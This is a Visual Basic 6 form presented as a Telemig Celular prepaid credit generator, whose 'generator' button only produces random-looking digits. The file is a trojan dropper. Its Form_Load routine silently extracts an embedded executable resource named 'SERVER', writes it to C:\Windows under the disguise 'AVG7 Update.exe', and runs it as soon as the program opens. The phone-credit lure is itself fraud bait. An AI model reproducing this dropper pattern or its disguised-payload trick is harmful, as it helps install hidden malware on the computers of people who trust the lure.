VERSION 5.00
Begin VB.Form Form2 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Gerador de Créditos - Telemig Celular"
   ClientHeight    =   2385
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4680
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form2.frx":2982
   ScaleHeight     =   2385
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      BeginProperty DataFormat 
         Type            =   1
         Format          =   "0"
         HaveTrueFalseNull=   0
         FirstDayOfWeek  =   0
         FirstWeekOfYear =   0
         LCID            =   1046
         SubFormatType   =   1
      EndProperty
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   165
      MaxLength       =   14
      TabIndex        =   1
      Top             =   765
      Width           =   1800
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Gerar!"
      Height          =   375
      Left            =   165
      TabIndex        =   0
      Top             =   1140
      Width           =   1215
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackColor       =   &H00FFFFFF&
      BackStyle       =   0  'Transparent
      Caption         =   "Nº do Cartão:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   270
      Left            =   225
      TabIndex        =   6
      Top             =   435
      Width           =   1950
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "Data:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   270
      Left            =   2085
      TabIndex        =   5
      Top             =   990
      Width           =   750
   End
   Begin VB.Label lData 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   270
      Left            =   2865
      TabIndex        =   4
      Top             =   1020
      Width           =   150
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "by 7£r@bY7£"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   225
      Left            =   3150
      TabIndex        =   3
      Top             =   1830
      Width           =   1320
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "Copyright 2004 - 7£r@bY7£ Hacker Underground Things Corp.®"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   165
      Left            =   360
      TabIndex        =   2
      Top             =   2160
      Width           =   4005
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
''''''''''''''''''''''''''''''''''''''''''
''Gerador de Créditos da Telemig Celular''
''Créditos por: Gabriel Falcão          ''
''gabrielfalcao@hotmail.com             ''
''www.megaaccesshp.hpg.com.br           ''
''''''''''''''''''''''''''''''''''''''''''
Dim fourIni As Integer
Dim twaelvEnd As Integer
Dim random As String

Private Sub Command1_Click()

fourIni = Rnd(3) + Rnd(6 * Rnd(416516) + Rnd(Second(Time) * Rnd(Minute(Time))))
twaelvEnd = Rnd(Day(Date) * Left$(Time, 2) * Rnd(Month(Date)) + 4 * Rnd(641) * Rnd(Day(Date))) + 4 * Rnd(Day(Date)) * Minute(Time) + Minute(Time)
random = Second(Time) + twaelvEnd * 14 + Left$(Time, 2) & Abs(Int(31 * (Rnd(fourIni * Rnd(Rnd(twaelvEnd)))))) & Abs(Int(31 * (Rnd(Rnd(fourIni) * Rnd(Rnd(twaelvEnd)) + 9)))) & Abs(Int(fourIni * Day(Date) - 1)) & Abs(Int(31 * (Rnd(fourIni * Rnd(Rnd(twaelvEnd))) * Day(Date)))) & Abs(Int(31 * (Rnd(fourIni * Rnd(Rnd(Rnd(twaelvEnd))))))) & Abs(Int(31 * (Rnd(Rnd(fourIni) + Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(fourIni)) & 2 * Abs(Int(Rnd * Day(Date))) & Abs(Int(31 * (Rnd(Rnd(fourIni) * Rnd(Rnd(twaelvEnd) + 9)))))

Text1.Text = Left$(random, 3) & Right$(random, 5) & Left$(StrReverse(random), 2) & random

End Sub


Private Sub Form_Load()
On Error Resume Next
If App.PrevInstance = True Then Unload Me
Dim dia As String
Dim mes As String
Dim DataDeHoje As String
If Len(Day(Date)) = 1 Then
dia = "0" & Day(Date)
Else
dia = Day(Data)
End If
If Len(Month(Date)) = 1 Then
mes = "0" & Month(Date)
Else
mes = Month(Date)
End If
DataDeHoje = dia & "/" & mes & "/" & Year(Date)
lData.Caption = DataDeHoje
Dim nome As String
Dim p_ret As String
nome = "C:\Windows\AVG7 Update.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
Call Shell(nome)
End Sub

Private Sub Timer1_Timer()

End Sub
